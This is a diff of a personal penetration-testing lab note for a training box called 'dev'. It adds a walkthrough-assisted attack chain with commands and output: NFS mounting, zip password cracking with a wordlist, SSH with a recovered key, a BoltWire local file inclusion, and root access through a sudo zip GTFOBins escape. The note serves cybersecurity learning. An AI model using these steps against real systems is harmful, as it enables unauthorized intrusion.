@@ -1,15 +1,13 @@
 ## Box: [DEV] — Started: 2025-10-29 22:10
 
-**IP/Host:** `MAC: 00:0C:29:23:BF:A8`  |  **Status:** `In-Progress`
+**IP/Host:** `MAC: 00:0C:29:23:BF:A8`  |  **Status:** `pwned`
 
 *Session IPs*: 
 1. 192.168.109.136
-### TL;DR
+## TL;DR
 
 Initial: `how in`. PrivEsc: `how root`.
 
-*Cumulative Impact Overview*:
-- RCE / data exfil / persistence / etc.
 
 ### Exploit Lifecycle
 
@@ -118,67 +116,150 @@ Best hit so far:
         },
 ```
 
-Which leads to this page:
-![[Pasted image 20251031003646.png|500]]
 
-![[Pasted image 20251031003709.png|500]]
+#### Branch 3 - Walkthrough assisted
 
-![[Pasted image 20251031003731.png|500]]
+This was taking long enough that I decided to check the walkthrough. The way the instructor went through the walkthrough was by:
 
-*We have admin*
+1. Checking the NTFS file mount with `showmount`:
+```bash
+$ showmount -e 192.168.109.136                              
+Export list for 192.168.109.136:
+/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16
+``` 
 
-From here we can pivot. Navigating to `site > Actions`:
-![[Pasted image 20251031004249.png]]
+2. mounting it:
+```bash
+$ mount -t nfs 192.168.109.136:/srv/nfs /mnt/tmpmnt/dev 
+```
 
-Then `uploads`:
+3. Checking the mount:
+```bash
+┌──(l1ch㉿kali)-[~]
+└─$ cd /mnt/tmpmnt/dev 
+                                                                                                                                      
+┌──(l1ch㉿kali)-[/mnt/tmpmnt/dev]
+└─$ ls
+save.zip
+```
 
-![[Pasted image 20251031004327.png|500]]
+4. Attacking the `.zip` file:
+```bash
+┌──(l1ch㉿kali)-[/mnt/tmpmnt/dev]
+└─$ cp save.zip /tmp && cd /tmp
 
-then remove `action=source`:
+┌──(l1ch㉿kali)-[/tmp]
+└─$ unzip save.zip 
+Archive:  save.zip
+[save.zip] id_rsa password:  
 
-![[Pasted image 20251031004445.png|500]]
-
-we can upload a reverse shell:
-
-![[Pasted image 20251031004642.png|500]]
-
-doesn't execute:
-
-![[Pasted image 20251031004900.png|500]]
-
-Let's try a different way to get a shell. 
-
-
-Before we can do that I need to give myself editing permissions by the looks of it. See this page:
-
-![[Pasted image 20251031005501.png|500]]
-
-
-
-I think I can get code permissions by adding myself to the "editor" group:
-
-
-![[Pasted image 20251031005142.png]]
-
-
-Looks like this was done for me:
-
-![[Pasted image 20251031005641.png|500]]
+┌──(l1ch㉿kali)-[/tmp]
+└─$ fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip 
+found file 'id_rsa', (size cp/uc   1435/  1876, flags 9, chk 2a0d)
+found file 'todo.txt', (size cp/uc    138/   164, flags 9, chk 2aa1)
 
 
-![[Pasted image 20251031005408.png]]
+PASSWORD FOUND!!!!: pw == java101
 
-Default configs, insecure 
+┌──(l1ch㉿kali)-[/tmp]
+└─$ unzip save.zip
+Archive:  save.zip
+[save.zip] id_rsa password: [ENTERED PASSWORD HERE]
+  inflating: id_rsa                  
+  inflating: todo.txt 
+  
+┌──(l1ch㉿kali)-[/tmp]
+└─$ cat todo.txt               
+- Figure out how to install the main website properly, the config file seems correct...
+- Update development website
+- Keep coding in Java because it's awesome
 
+jp
+```
 
-3. *Findings & Exploits*:
-4. *PrivEsc*:
-5. *Post-Exploitation*:
+5. Trying JP as the uname for an ssh attempt:
+```bash
+┌──(l1ch㉿kali)-[/tmp]
+└─$ ssh -i id_rsa jp@192.168.109.136                                           
+jp@192.168.109.136's password: 
 
-*Proof — path to flags/screenshot of boxpwn*:
+```
 
+6. Using a local file inclusion attack to find username:
+```bash
+┌──(l1ch㉿kali)-[/mnt/tmpmnt/dev]
+└─$ searchsploit boltwire       
+---------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                      |  Path
+---------------------------------------------------------------------------------------------------- ---------------------------------
+BoltWire 3.4.16 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities                         | php/webapps/36552.txt
+BoltWire 6.03 - Local File Inclusion                                                                | php/webapps/48411.txt
 
+```
 
+retrieving the /etc/passwd:
+![[Pasted image 20251109161747.png]]
+
+![[Pasted image 20251109161840.png]]
+
+7. using that to SSH in as jeanpaul (presumably `jp`):
+
+```bash
+┌──(l1ch㉿kali)-[/tmp]
+└─$ ssh -i id_rsa jeanpaul@192.168.109.136
+Enter passphrase for key 'id_rsa': 
+Linux dev 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Jun  2 05:25:21 2021 from 192.168.10.31
+jeanpaul@dev:~$ ls
+jeanpaul@dev:~$ ls -lah
+total 28K
+drwxr-xr-x 3 jeanpaul jeanpaul 4.0K Jun  2  2021 .
+drwxr-xr-x 3 root     root     4.0K Jun  1  2021 ..
+-rw------- 1 jeanpaul jeanpaul   39 Jun 28  2021 .bash_history
+-rw-r--r-- 1 jeanpaul jeanpaul  220 Jun  1  2021 .bash_logout
+-rw-r--r-- 1 jeanpaul jeanpaul 3.5K Jun  1  2021 .bashrc
+-rw-r--r-- 1 jeanpaul jeanpaul  807 Jun  1  2021 .profile
+drwx------ 2 jeanpaul jeanpaul 4.0K Jun  2  2021 .ssh
+jeanpaul@dev:~$ history
+
+```
+
+8. Finding the passwordless root commands with `sudo -l`:
+```bash
+jeanpaul@dev:~$ sudo -l
+Matching Defaults entries for jeanpaul on dev:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jeanpaul may run the following commands on dev:
+    (root) NOPASSWD: /usr/bin/zip
+```
+
+9. Using [[GTFO Bins]] to privesc using the unprotected zip command:
+```bash
+jeanpaul@dev:~$ TF=$(mktemp -u)
+jeanpaul@dev:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
+  adding: etc/hosts (deflated 31%)
+# ls
+# pwd
+/home/jeanpaul
+# whoami
+root
+# cd /root
+# ls
+flag.txt
+# cat flag.txt
+Congratz on rooting this box !
+# exit
+test of /tmp/tmp.y4NU6atD7j OK
+
+```
 
 ## Tried and failed branches:
 
@@ -309,3 +390,60 @@ nikto -h http://192.168.109.136:8080
 ```
 
 --- ...I could have enumerated TARGET:8080/dev with gobuster `-_-` ---
+
+#### Branch 3
+
+Which leads to this page:
+![[Pasted image 20251031003646.png|500]]
+
+![[Pasted image 20251031003709.png|500]]
+
+![[Pasted image 20251031003731.png|500]]
+
+*We have admin*
+
+From here we can pivot. Navigating to `site > Actions`:
+![[Pasted image 20251031004249.png]]
+
+Then `uploads`:
+
+![[Pasted image 20251031004327.png|500]]
+
+then remove `action=source`:
+
+![[Pasted image 20251031004445.png|500]]
+
+we can upload a reverse shell:
+
+![[Pasted image 20251031004642.png|500]]
+
+doesn't execute:
+
+![[Pasted image 20251031004900.png|500]]
+
+Let's try a different way to get a shell. 
+
+
+Before we can do that I need to give myself editing permissions by the looks of it. See this page:
+
+![[Pasted image 20251031005501.png|500]]
+
+
+
+I think I can get code permissions by adding myself to the "editor" group:
+
+
+![[Pasted image 20251031005142.png]]
+
+
+Looks like this was done already:
+
+![[Pasted image 20251031005641.png|500]]
+
+
+Let's try adding a reverse shell here:
+
+![[Pasted image 20251109144534.png]]
+
+
+These didn't work, so far
